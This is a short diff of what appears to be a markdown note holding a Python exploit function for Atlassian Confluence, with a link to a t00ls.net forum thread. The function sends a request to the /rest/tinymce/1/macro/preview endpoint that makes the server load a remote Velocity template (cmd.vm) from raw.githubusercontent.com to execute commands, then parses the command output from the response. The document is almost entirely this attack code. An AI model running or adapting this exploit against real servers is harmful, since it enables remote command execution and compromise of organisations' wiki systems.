@@ -1,7 +1,7 @@
+```
 def _exec(url,cmd):
     result = {}
     filename = "https://raw.githubusercontent.com/ba0zi/confluence/master/cmd.vm"
-
     paylaod = url + "/rest/tinymce/1/macro/preview"
     headers = {
         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
@@ -15,6 +15,7 @@ def _exec(url,cmd):
         m = re.findall('.*wiki-content">\n(.*)\n            </div>\n', r.text, re.S)
 
     return m[0]
-    
-    
-    https://www.t00ls.net/viewthread.php?tid=50686&extra=&highlight=confluence&page=1
+
+```
+
+https://www.t00ls.net/viewthread.php?tid=50686&extra=&highlight=confluence&page=1
